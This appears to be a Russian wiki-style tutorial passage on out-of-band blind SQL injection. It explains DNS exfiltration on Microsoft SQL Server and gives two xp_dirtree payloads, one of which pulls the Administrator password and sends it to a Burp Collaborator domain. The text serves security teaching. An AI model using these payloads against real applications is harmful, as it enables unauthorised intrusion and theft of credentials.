Приложение может выполнять запрос в асинхронно. Т.е приложение продолжает рпабоать с пользователем в одном потоке, а SQL запрос выполняет в другом. Ответ приложения не зависит от запроса, возвращающего какие-либо данные, от возникшей ошибки базы данных или от времени, затраченного на выполнение запроса. В этом случае классические методы не сработают, но это не значет, что он не уязвим.

В этой ситуации часто можно воспользоваться уязвимостью "[[Blind SQL injection |слепого внедрения SQL]]", инициируя внеполосное сетевое взаимодействие с системой, которую вы контролируете. Они могут запускаться на основе введенного условия для вывода информации по частям за раз. Что более удобно, данные могут быть отфильтрованы непосредственно в рамках сетевого взаимодействия.


## Использование слепой SQL-инъекции с использованием внеполосных методов (OAST)

Для этой цели можно использовать различные сетевые протоколы, но обычно наиболее эффективным является [[DNS]] (служба доменных имен). Многие производственные сети допускают свободный выход DNS-запросов, поскольку они необходимы для нормальной работы производственных систем.

Методы запуска DNS-запроса зависят от типа используемой базы данных. Например, следующие входные данные на Microsoft SQL Server могут использоваться для запуска DNS-поиска в указанном домене.:

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

Вы можете использовать [[Burp Collaborator]] для создания уникального поддомена и опроса сервера Collaborator для подтверждения, когда происходят какие-либо запросы DNS.

После подтверждения способа запуска внеполосных взаимодействий вы можете затем использовать внеполосный канал для извлечения данных из уязвимого приложения. Например:

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

Этот ввод считывает пароль для `Administrator` пользователя, добавляет уникальный поддомен Collaborator и запускает поиск в DNS